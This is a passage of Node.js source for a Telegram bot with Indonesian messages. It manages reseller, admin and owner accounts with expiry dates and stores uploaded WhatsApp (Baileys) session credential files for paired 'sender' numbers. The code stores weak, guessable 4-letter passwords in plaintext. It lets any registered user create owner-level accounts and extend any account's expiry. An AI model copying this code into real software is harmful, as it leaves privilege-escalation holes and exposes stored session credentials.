  const user = db.find(u => u.telegram_id == id);
  return user?.role || null;
}

function generateUniquePassword(existing) {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
  for (let i = 0; i < 1000; i++) {
    let pass = '';
    while (pass.length < 4) {
      const char = chars[Math.floor(Math.random() * chars.length)];
      if (!pass.includes(char)) pass += char;
    }
    if (!existing.includes(pass)) return pass;
  }
  throw new Error("Gagal buat password unik.");
}

function isFromGroup(msg) {
  return msg.chat && (msg.chat.type === "group" || msg.chat.type === "supergroup") && msg.chat.id === allowedGroupId;
}

// =========================
// Menu (Group only)
// =========================
bot.onText(/\/(start|menu)/, (msg) => {
  if (!isFromGroup(msg)) return;

  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak terdaftar untuk menggunakan bot ini.");

  const caption = `𝙷𝚎𝚕𝚕𝚘𝚠 𝙸 𝚊𝚖 𝙱𝚘𝚝 𝙰𝚜𝚜𝚒𝚜𝚝𝚎𝚗 𝙱𝚢 @KuuXTeam
╭━━━━━━━━━━━━━━━━
┃⇥ 𝙲𝚛𝚎𝚊𝚝𝚎 𝙼𝚎𝚖𝚋𝚎𝚛𝚜 : /createmember
┃     ↳ 𝙾𝚗𝚕𝚢 𝚁𝚎𝚜𝚜/𝙰𝚍𝚖𝚒𝚗/𝙾𝚠𝚗𝚎𝚍 
┃⇥ 𝙰𝚍𝚍 𝚁𝚎𝚜𝚎𝚕𝚕𝚎𝚛 : /addreseller
┃     ↳ 𝙾𝚗𝚕𝚢 𝙰𝚍𝚖𝚒𝚗/𝙾𝚠𝚗𝚎𝚍 
┃⇥ 𝙰𝚍𝚍 𝙰𝚍𝚖𝚒𝚗 : /addadmin
┃     ↳ 𝙾𝚗𝚕𝚢 𝙾𝚠𝚗𝚎𝚍
╭━━━━━━━━━━━━━━━━
┃⇥ 𝙻𝚒𝚜𝚝 𝚄𝚜𝚎𝚛 : /listuser
┃     ↳ 𝙾𝚗𝚕𝚢 𝙾𝚠𝚗𝚎𝚍
┃⇥ 𝚁𝚎𝚏𝚛𝚎𝚜𝚑 : /refresh
┃     ↳ 𝙾𝚗𝚕𝚢 𝙾𝚠𝚗𝚎𝚍 
┃⇥ 𝙳𝚎𝚕𝚎𝚝𝚎 𝚄𝚜𝚎𝚛 : /deleteuser
┃     ↳ 𝙾𝚗𝚕𝚢 𝙾𝚠𝚗𝚎𝚍 
┃⇥ 𝚂𝚎𝚝 𝙴𝚡𝚙𝚒𝚛𝚎𝚍 : /setexp
┃     ↳ 𝙰𝚕𝚕 𝚁𝚘𝚕𝚎 
╰━━━━━━━━━━━━━━━━━
< 𝚇-𝚅𝚣𝚡𝚝𝚞𝚜 𝙴𝙲𝚘𝚖𝚞𝚗𝚗𝚒𝚝𝚢 >`;

  bot.sendPhoto(msg.chat.id, "https://files.catbox.moe/chnwkr.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝙾𝚆𝙽𝙴𝙳", url: "https://t.me/vizxzku" },
          { text: "𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝙿𝙴𝙽𝚃𝙸𝙽𝙶", url: "https://t.me/KuuXTeam" }
        ]
      ]
    }
  });
});
// ===========Add Members=============
bot.onText(/^\/createmember(@\w+)?(?:\s+(.+))?/, async (msg, match) => {
  if (!isFromGroup(msg)) return;

  const role = getRoleByTelegramId(msg.from.id);
  if (!role) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak terdaftar.");

  if (!match[2]) return bot.sendMessage(msg.chat.id, "❌ Format kosong. Gunakan: /addmember user|id|durasi");

  try {
    const [username, idTujuan, durasi] = match[2].split("|").map(s => s.trim());
    const db = loadDatabase();

    if (db.find(u => u.username === username)) {
      return bot.sendMessage(msg.chat.id, "❌ Username sudah terdaftar!");
    }

    const password = generateUniquePassword(db.map(u => u.password));
    const expired = new Date();
    expired.setDate(expired.getDate() + parseInt(durasi));
    const expiredDate = expired.toISOString().split("T")[0];

    db.push({ username, password, role: "member", telegram_id: idTujuan, expiredDate });
    saveDatabase(db);

    await bot.sendMessage(idTujuan, `🔐 Akun Kamu Telah Dibuat:\n\n👤 Username: ${username}\n🔑 Password: ${password}\n📅 Expired: ${expiredDate}`);
    bot.sendMessage(msg.chat.id, `✅ Akun *${username}* berhasil dibuat dan dikirim ke ID ${idTujuan}.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("[ERROR] addmember:", err.message);
    bot.sendMessage(msg.chat.id, "❌ Terjadi kesalahan saat membuat akun.");
  }
});


bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});
bot.onText(/\/refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "Sok Asik Lu Anjing")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})
bot.onText(/\/list_sender/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();


  const connectedNumbers = Object.keys(activeConnections);
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Connected Numbers (Online):\n`;
  message += onlineNumbers.length > 0
    ? onlineNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});
    bot.onText(/\/pairing (.+)/, async (msg, match) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
        const number = match[1]
  if (!isOwner) return bot.sendMessage(chatId, "Sok Asik Lu Anjing")

        if (!number) {
            return bot.sendMessage(chatId, "⚠️ Usage: /pairing <number>");
        }

        await pairingWa(bot, chatId, number);
    });

// /address (Only admin, owner)
bot.onText(/^\/addreseller(@\w+)?(?:\s+(.+))?/, (msg, match) => {
  if (!isFromGroup(msg)) return;
  const role = getRoleByTelegramId(msg.from.id);
  if (!["admin", "owner"].includes(role)) return bot.sendMessage(msg.chat.id, "❌ Hanya Admin/Owner.");

  const input = match[2];
  if (!input || !input.includes("|")) return bot.sendMessage(msg.chat.id, "❌ Format: /addreseller id|durasi");

  const [tgId, durasi] = input.split("|").map(s => s.trim());
  const db = loadDatabase();

  const days = parseInt(durasi.replace("d", ""));
  const expired = new Date();
  expired.setDate(expired.getDate() + days);
  const expiredDate = expired.toISOString().split("T")[0];

  db.push({
    username: `reseller_${tgId}`,
    password: null,
    telegram_id: tgId,
    role: "reseller",
    expiredDate
  });

  saveDatabase(db);
  bot.sendMessage(msg.chat.id, `✅ Reseller ditambahkan: ${tgId}`);
});

// /addadmin (Only owner)
bot.onText(/^\/addadmin(@\w+)?(?:\s+(.+))?/, (msg, match) => {
  if (!isFromGroup(msg)) return;
  if (getRoleByTelegramId(msg.from.id) !== "owner") return bot.sendMessage(msg.chat.id, "❌ Hanya Owner.");

  const input = match[2];
  if (!input || !input.includes("|")) return bot.sendMessage(msg.chat.id, "❌ Format: /addadmin id|durasi");

  const [tgId, durasi] = input.split("|").map(s => s.trim());
  const db = loadDatabase();

  const days = parseInt(durasi.replace("d", ""));
  const expired = new Date();
  expired.setDate(expired.getDate() + days);
  const expiredDate = expired.toISOString().split("T")[0];

  db.push({
    username: `admin_${tgId}`,
    password: null,
    telegram_id: tgId,
    role: "admin",
    expiredDate
  });

  saveDatabase(db);
  bot.sendMessage(msg.chat.id, `✅ Admin ditambahkan: ${tgId}`);
});

// /addowner (Only owner) — hanya tambahkan ID ke config.ownerList
bot.onText(/^\/addowner(@\w+)?(?:\s+(.+))?/, (msg, match) => {
  if (!isFromGroup(msg)) return;
  if (getRoleByTelegramId(msg.from.id) !== "owner") return bot.sendMessage(msg.chat.id, "❌ Hanya Owner.");

  const input = match[2];
  if (!input || !input.includes("|")) return bot.sendMessage(msg.chat.id, "❌ Format: /addowner id|durasi");

  const [tgId, durasi] = input.split("|").map(s => s.trim());
  const db = loadDatabase();

  const days = parseInt(durasi.replace("d", ""));
  const expired = new Date();
  expired.setDate(expired.getDate() + days);
  const expiredDate = expired.toISOString().split("T")[0];

  db.push({
    username: `owner_${tgId}`,
    password: null,
    telegram_id: tgId,
    role: "owner",
    expiredDate
  });

  saveDatabase(db);
  bot.sendMessage(msg.chat.id, `✅ Owner ditambahkan: ${tgId}`);
});

// /listuser (admin/owner only)
bot.onText(/^\/listuser(@\w+)?$/, (msg) => {
  if (!isFromGroup(msg)) return;
  const role = getRoleByTelegramId(msg.from.id);
  if (!['admin', 'owner'].includes(role)) return bot.sendMessage(msg.chat.id, "❌ Hanya Admin/Owner.");

  const users = getFormattedUsers();
  bot.sendMessage(msg.chat.id, `📋 *Daftar User:*\n${users}`, { parse_mode: "Markdown" });
});

// =========================
// /deleteuser (owner only)
// =========================
bot.onText(/^\/deleteuser(@\w+)?$/, (msg) => {
  if (!isFromGroup(msg)) return;
  const role = getRoleByTelegramId(msg.from.id);
  if (role !== "owner") return bot.sendMessage(msg.chat.id, "❌ Hanya Owner yang bisa hapus user.");

  bot.sendMessage(msg.chat.id, "Masukkan username yang ingin dihapus:");
  bot.once("message", msg2 => {
    if (!isFromGroup(msg2)) return;
    const db = loadDatabase();
    const index = db.findIndex(u => u.username === msg2.text.trim());
    if (index === -1) return bot.sendMessage(msg2.chat.id, "❌ User tidak ditemukan.");
    const removed = db.splice(index, 1)[0];
    saveDatabase(db);
    bot.sendMessage(msg2.chat.id, `🗑️ User ${removed.username} dihapus.`);
  });
});

// /costumeuser (semua role)
bot.onText(/^\/costumeuser(@\w+)?(?:\s+(.+))?/, (msg, match) => {
  if (!isFromGroup(msg)) return;
  const role = getRoleByTelegramId(msg.from.id);
  if (!role) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak terdaftar.");

  const input = match[2];
  if (!input || input.split("|").length !== 4) return bot.sendMessage(msg.chat.id, "❌ Format: /costumeuser user|pw|role|expired");

  const [username, password, roleSet, expiredDate] = input.split("|").map(s => s.trim());
  const db = loadDatabase();
  if (db.find(u => u.username === username)) return bot.sendMessage(msg.chat.id, "❌ Username sudah terdaftar!");

  db.push({ username, password, role: roleSet, telegram_id: null, expiredDate });
  saveDatabase(db);
  bot.sendMessage(msg.chat.id, `✅ Costume user dibuat:\nUsername: ${username}\nRole: ${roleSet}\nExpired: ${expiredDate}`);
});

// /setexpired (semua role, hanya bisa extend user sendiri)
bot.onText(/^\/setexpired(@\w+)?(?:\s+(.+))?/, (msg, match) => {
  if (!isFromGroup(msg)) return;
  const role = getRoleByTelegramId(msg.from.id);
  if (!role) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak terdaftar.");

  const input = match[2];
  if (!input || !input.includes("|")) return bot.sendMessage(msg.chat.id, "❌ Format salah. /setexpired username|hari");

  const [username, tambah] = input.split("|").map(s => s.trim());
  const db = loadDatabase();
  const user = db.find(u => u.username === username);

  if (!user) return bot.sendMessage(msg.chat.id, "❌ User tidak ditemukan.");

  const expired = new Date(user.expiredDate);
  expired.setDate(expired.getDate() + parseInt(tambah));
  user.expiredDate = expired.toISOString().split("T")[0];
  saveDatabase(db);

  bot.sendMessage(msg.chat.id, `✅ Masa aktif *${username}* diperpanjang hingga ${user.expiredDate}`, { parse_mode: "Markdown" });
});

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
});
